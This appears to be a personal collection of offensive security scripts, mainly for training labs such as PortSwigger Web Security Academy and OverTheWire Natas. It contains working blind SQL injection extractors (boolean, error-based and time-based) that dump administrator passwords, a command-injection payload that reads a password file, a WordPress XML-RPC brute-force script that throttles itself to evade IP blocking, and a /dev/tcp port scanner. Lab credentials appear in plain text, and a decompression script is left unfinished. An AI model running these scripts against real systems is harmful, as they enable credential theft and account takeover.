- **Scan port** 
manual port scanner for a specific range of ports

#bash

```
for port in $(seq 31000 32000);do
   (echo '' > /dev/tcp/IP/$port) 2>/dev/null && echo "[+] $port -> OPEN"
done
```

____________________

-  **7z Universal decompressor**
file decompression automation (applied to a file compressed multiple times)

#bash

```
#!/bin/bash

function ctrl_c(){
  echo -e "[!]saliendo... "
  exit -1
}

trap ctrl_c INT

first="data.gz"
descomp=$(7z l data.gz | tail -n 3 | head -n 1 | awk 'NF{print $NF}')
# Here's our file which is unzipped  

7z x data.gz  &>/dev/null
# I'll unzip it here

while [ $descomp ]; do 
# Here I confirm that there is something
  echo -e "\n\n The new unzipped file is : $descomp " 
# I'm referring to the compressed file, which is the same as above.

  7z x $descomprimidonombre &>/dev/null 
  # I unzip the value announced above
  descomp=$(7z l $descomp | tail -n 3 | head -n 1 | awk 'NF{print $NF}') 
  # And now I announce the new one that will be compressed
```

_________________________

- **SQL Injection with Conditional responses**
Extracting a password letter by letter from a SQL Injection with Conditional responses

#python

```
import string
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a0500c403584776862e717a009500b7.web-security-academy.net/'
payload ="' and (select substring(password,{},1) from users where username='administrator')='{}'--"
characters = string.printable
password = ''

for i in range(1,21):
   for char in characters:
     cookie = {'TrackingId' : 'AT7GHC91PCzpKX6m' + payload.format(i, char)}
     r = requests.get(url, cookies=cookie, verify=False)
     if "Welcome" in r.text:
     # The conditional response is determinated if "Welcome back" appears on the page
       password += char
       break
   print("[]La contraseña es = {}".format(password))
```

________

- **SQL Injection with Conditional error**
Extracting a password letter by letter from a SQL Injection with **Conditional error**

#python

#v1

```
 #!/usr/bin/env python3

import requests
import string
import urllib.parse

url ='https://0a1700f804408bda83ae331900b000a9.web-security-academy.net/'
query = " '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' and substr(password,{},1)={}||'"
password = ''
characters = string.printable

for i in range(1, 21):
  for char in characters:
       injection= query.format(i, char)
       cookie = { 'trackingId' : 'oKdpY2xtOOsLEZfc' + urllib.parse.quote(injection)}
       solicitud = requests.get(url, cookies=cookie)
       if solicitud.status_code == 500:
          password += char
          print(f"The password is {password}")
          break

```

#v2

#python 

```
import string
import requests
import urllib.parse

url = 'https://0a5100d20443d37e88c9577700c700ab.web-security-academy.net'

# Payload de inyección con dos {} para .format(posición, carácter)
payload = "'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'>

# Solo letras, números y símbolos visibles
letters = string.ascii_letters + string.digits + string.punctuation

password = ''

for i in range(1, 21):
    for char in letters:
        inj = payload.format(i, char)
        encoded = urllib.parse.quote(inj)
        cookies = { 'TrackingId': 'sh2JrpZI4FQDjODd' + encoded }

        r = requests.get(url, cookies=cookies)

        print(f"Probando posición {i} con carácter {repr(char)}")

        if r.status_code == 500:
            password += char
            print(f"[+] partial password: {password}")
            break

print(f"[✓] Contraseña completa: {password}")
```

____________________________

- **Blind SQL injection with time delays and information retrieval**
Extracting a password letter by letter from a **Blind SQL injection with time delays and information retrieval**, empathize the use of the library ***tqdm*** to provide a more professional and user-friendly visual interface

#python

```
#!/usr/bin/env python3

import requests
import string
import time
import urllib3
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a5600ff04c012dc821f0bf2005a0037.web-security-academy.net/'
password = ''
characters = string.digits + string.ascii_letters

for i in tqdm(range(1, 21), desc="Procesando...", colour="green"):
   time.sleep(0.01)
   for char in characters:
        payload = "'||(SELECT CASE WHEN (username = 'administrator' and substring(password,{},1)='{}') THEN pg_sleep(8) ELSE '' END from users)||'"
        inj = payload.format(i, char)
        cookies = { 'TrackingId' : 'PpnkzJZWijBChvuk' + inj }
        start = time.time()
        r = requests.get(url, cookies=cookies, verify=False)
        end = time.time()
        #tiempo = end - start
        if end - start > 7:
          password += char
          print(f"digit founded {char}")
          break 
   print(f"[]Character founded {password} ")
```

_____________

- **Database not sanitizied**
Extracting a password from a **database**, the page filter if a username is valid or not as security method  

#python

```
import requests
from requests.auth import HTTPBasicAuth
import string

# Target configuration
target_url = "http://natas15.natas.labs.overthewire.org/"
auth = HTTPBasicAuth('natas15', 'TTGAYUA9uREpq6STvql649DrBAs6SsnS')

# We define the character set: lowercase letters, uppercase letters, and numbers
charset = string.ascii_letters + string.digits
password = ""

print("--- Starting password extraction ---")

# Natas passwords are usually 32 characters long
for i in range(32):
    for char in charset:
        # The key is "LIKE BINARY" to distinguish between uppercase and lowercase letters.
        # The "%" is the wildcard that means "anything after this"
        payload = f'natas16" AND password LIKE BINARY "{password + char}%'
        
        try:
            response = requests.post(target_url, auth=auth, data={'username': payload})
            
            # If the server responds that the user exists, we have found the correct character.
            if "This user exists" in response.text:
                password += char
                print(f"[+] Character {i+1} found: {char} -> {password}")
                break
        except Exception as e:
            print(f"Connection error: {e}")

print(f"\n[!] Complete extraction. Password: {password}")
```

_____________

- **php not sanitizated by use passthru()**
Extracting a password from a page which is not sanitized properly due to a direct conection betheween the php (layer 2) and the SHELL (layer 4). This happens due to the use of **_passthru()**

#python

```
import requests
from requests.auth import HTTPBasicAuth
import string

# Target configuration
target_url = "http://natas16.natas.labs.overthewire.org/"
auth = HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

# We define the character set: lowercase letters, uppercase letters, and numbers
charset = string.ascii_letters + string.digits
password = ""

print("--- Starting password extraction ---")

# Natas passwords are usually 32 characters long
for i in range(32):
    for char in charset:
        payload = f'Sunday$(grep ^{password + char} /etc/natas_webpass/natas17)'
        
        try:
            response = requests.get(target_url, auth=auth, params={'needle': payload})
            
              
            if "Sunday" not in response.text:
                password += char
                print(f"[+] Character {i+1} found: {char} -> {password}")
                break
        except Exception as e:
            print(f"Connection error: {e}")

print(f"\n[!] Complete extraction. Password: {password}")
```

_______________
- **XML-RPC as attack vector**
 This script was designed to  extract a password by exploiting an Entry Point by **XML-RPC**, taking advantage of **wp.getUsersBlogs** to validate crendentials. I emphasized the use of  a time cooler conditional to avoid IP blocking

```
#!/bin/bash

function ctrl_c(){
  echo -e "\n[+] Exiting..."
  exit 1
}

trap ctrl_c SIGINT

counter=0

function createXML(){
    password=$1
    valueXML="
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value><![CDATA[$password]]></value></param>
</params>
</methodCall>"

    echo "$valueXML" > data.xml
    consult=$(curl -s -X POST http://IP/wordpress/xmlrpc.php -d@data.xml)

    # Filter for success: Check if the response DOES NOT contain known error strings
    if [ ! "$(echo $consult | grep 'Incorrect username or password')" ] && \
       [ ! "$(echo $consult | grep 'Insufficient arguments')" ] && \
       [ ! "$(echo $consult | grep 'parse error')" ]; then
          echo -e "\n[+] Password Found! [+] -> $password"
          exit 0
    fi

    let counter+=1

    # Rate limiting: 2500 requests per burst, then sleep 2s to avoid IP blocking
    if [ "$counter" -eq 2500 ]; then
             echo " [!] $counter attempts reached. Cooling down for 2s..."
             let counter=0
             sleep 2
    fi
}

# Main loop using pv for progress monitoring
pv -l /opt/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt | while read password; do
   createXML "$password"
done
```













        
